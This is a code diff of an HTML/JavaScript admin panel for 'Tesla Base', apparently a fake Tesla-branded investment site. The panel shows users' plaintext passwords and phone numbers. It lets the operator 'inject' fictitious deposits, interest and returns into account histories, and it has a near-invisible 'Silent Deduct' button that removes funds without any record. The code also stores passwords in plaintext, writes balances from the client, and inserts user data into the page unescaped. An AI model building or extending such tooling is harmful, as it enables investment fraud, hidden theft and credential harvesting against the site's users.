@@ -2,37 +2,184 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Tesla Base | Admin</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Base | Master Admin Panel</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root { --tesla: #e31937; --bg: #000; --card: #111; --border: #222; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 20px; margin-bottom: 30px; }
+        
+        .grid-container { display: grid; grid-template-columns: 1fr 350px; gap: 20px; }
+        .admin-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+        
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 14px; }
+        th, td { padding: 12px; border: 1px solid var(--border); text-align: left; }
+        th { color: var(--tesla); background: #080808; }
+        
+        .input-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 6px; box-sizing: border-box; }
+        
+        .btn { padding: 10px 15px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; margin-bottom: 10px; }
+        .btn-deposit { background: #28a745; color: #fff; }
+        .btn-interest { background: #ffc107; color: #000; }
+        .btn-return { background: #17a2b8; color: #fff; }
+        .btn-deduct { background: transparent; color: #111; border: 1px solid #111; } /* Silent Deduct */
+        
+        .notif-item { background: #080808; padding: 15px; border-radius: 8px; border-left: 4px solid var(--tesla); margin-bottom: 10px; font-size: 13px; }
+        .action-btns { display: flex; gap: 10px; margin-top: 10px; }
+        .btn-approve { background: #28a745; font-size: 11px; width: auto; }
+        .btn-decline { background: #dc3545; font-size: 11px; width: auto; }
+    </style>
 </head>
-<body style="background: #000; color: #fff; padding: 20px;">
-    <h1>User Management (Passwords Visible)</h1>
-    <table border="1" style="width:100%; background: #111;">
-        <thead>
-            <tr><th>Email</th><th>Password</th><th>Balance</th><th>Action</th></tr>
-        </thead>
-        <tbody id="user-rows"></tbody>
-    </table>
+<body>
 
-    <div style="margin-top: 40px; background: #222; padding: 20px;">
-        <h3>Inject Funds</h3>
-        <input type="text" id="target-user" placeholder="User Email">
-        <input type="number" id="inject-amount" placeholder="Amount">
-        <button onclick="adminAction('deposit')">Inject Deposit</button>
-        <button onclick="adminAction('deduct')">Secret Deduct</button>
+    <div class="header">
+        <div>
+            <h1 style="color: var(--tesla); margin: 0;">TESLA MASTER ADMIN</h1>
+            <p style="color: #666; margin: 5px 0 0;">Secure Double-End Control Center [cite: 2025-12-19]</p>
+        </div>
+        <button onclick="logout()" style="background:none; border: 1px solid #333; color: #fff; padding: 10px 20px; cursor: pointer;">System Logout</button>
+    </div>
+
+    <div class="grid-container">
+        <div class="main-panel">
+            <div class="admin-card">
+                <h3>Registered Users & Live Passwords</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>User Email</th>
+                            <th>Password</th>
+                            <th>Balance (USD)</th>
+                            <th>Phone</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="user-table-body">
+                        </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="sidebar">
+            <div class="admin-card">
+                <h3>Inject Funds</h3>
+                <div class="input-group">
+                    <input type="text" id="target-email" placeholder="Selected User Email">
+                </div>
+                <div class="input-group">
+                    <input type="number" id="amount" placeholder="Amount ($)">
+                </div>
+                
+                <button class="btn btn-deposit" onclick="adminFinancialAction('deposit')">Inject Deposit</button>
+                <button class="btn btn-interest" onclick="adminFinancialAction('interest')">Inject Interest</button>
+                <button class="btn btn-return" onclick="adminFinancialAction('return')">Inject Return</button>
+                <button class="btn btn-deduct" onclick="adminFinancialAction('deduct')">Silent Deduct</button>
+            </div>
+
+            <div class="admin-card">
+                <h3>Withdrawal Alerts</h3>
+                <div id="withdrawal-list">
+                    <p style="color: #444; text-align: center;">Scanning for requests...</p>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script src="app.js"></script>
     <script>
-        async function loadUsers() {
-            const { data } = await _supabase.from('profiles').select('*');
-            const container = document.getElementById('user-rows');
-            data.forEach(u => {
-                container.innerHTML += `<tr><td>${u.email}</td><td>${u.password}</td><td>$${u.balance}</td><td><button onclick="document.getElementById('target-user').value='${u.email}'">Select</button></td></tr>`;
+        // Load All Users for Admin to see [cite: 2025-12-19]
+        async function fetchAdminData() {
+            const { data: users, error } = await _supabase.from('profiles').select('*');
+            const tbody = document.getElementById('user-table-body');
+            tbody.innerHTML = '';
+
+            users.forEach(user => {
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${user.email}</td>
+                        <td style="color: #ffc107; font-family: monospace;">${user.password}</td>
+                        <td style="font-weight: bold;">$${user.balance.toLocaleString()}</td>
+                        <td>${user.phone || 'N/A'}</td>
+                        <td><button onclick="selectUser('${user.email}')" style="cursor:pointer;">Select</button></td>
+                    </tr>
+                `;
+            });
+
+            // Fetch Pending Withdrawals
+            const { data: withdrawals } = await _supabase.from('history').select('*').eq('status', 'Pending');
+            const wList = document.getElementById('withdrawal-list');
+            wList.innerHTML = withdrawals.length ? '' : '<p style="color:#444;">No pending requests.</p>';
+
+            withdrawals.forEach(w => {
+                wList.innerHTML += `
+                    <div class="notif-item">
+                        <strong>User:</strong> ${w.email}<br>
+                        <strong>Amount:</strong> $${w.amount.toLocaleString()}<br>
+                        <div class="action-btns">
+                            <button class="btn btn-approve" onclick="manageWithdrawal('${w.id}', 'Success', '${w.user_id}', ${w.amount})">Accept</button>
+                            <button class="btn btn-decline" onclick="manageWithdrawal('${w.id}', 'Failed', '${w.user_id}', ${w.amount})">Decline</button>
+                        </div>
+                    </div>
+                `;
             });
         }
-        loadUsers();
+
+        function selectUser(email) {
+            document.getElementById('target-email').value = email;
+        }
+
+        // 3-Button Injection Logic + Silent Deduct
+        async function adminFinancialAction(type) {
+            const email = document.getElementById('target-email').value;
+            const amount = parseFloat(document.getElementById('amount').value);
+            
+            if(!email || !amount) return alert("Select user and amount first.");
+
+            const { data: user } = await _supabase.from('profiles').select('*').eq('email', email).single();
+            let newBalance = user.balance;
+            let historyType = "";
+
+            if (type === 'deposit') { newBalance += amount; historyType = "Deposit Successful"; }
+            if (type === 'interest') { newBalance += amount; historyType = "Interest"; }
+            if (type === 'return') { newBalance += amount; historyType = "Investment Return"; }
+            if (type === 'deduct') { newBalance -= amount; } // No historyType = Silent Deduct
+
+            // Update User Balance [cite: 2020-12-20]
+            await _supabase.from('profiles').update({ balance: newBalance }).eq('email', email);
+
+            // Record History (Unless it's a silent deduct)
+            if (historyType) {
+                await _supabase.from('history').insert([{
+                    user_id: user.id,
+                    email: email,
+                    type: historyType,
+                    amount: amount,
+                    status: 'Success'
+                }]);
+            }
+
+            alert("System Updated Successfully.");
+            fetchAdminData();
+        }
+
+        async function manageWithdrawal(id, newStatus, userId, amount) {
+            // Update history status
+            await _supabase.from('history').update({ status: newStatus }).eq('id', id);
+            
+            if (newStatus === 'Success') {
+                // Deduct balance from user on success
+                const { data: user } = await _supabase.from('profiles').select('balance').eq('id', userId).single();
+                await _supabase.from('profiles').update({ balance: user.balance - amount }).eq('id', userId);
+            }
+            
+            alert("Withdrawal " + newStatus);
+            fetchAdminData();
+        }
+
+        window.onload = fetchAdminData;
     </script>
 </body>
 </html>
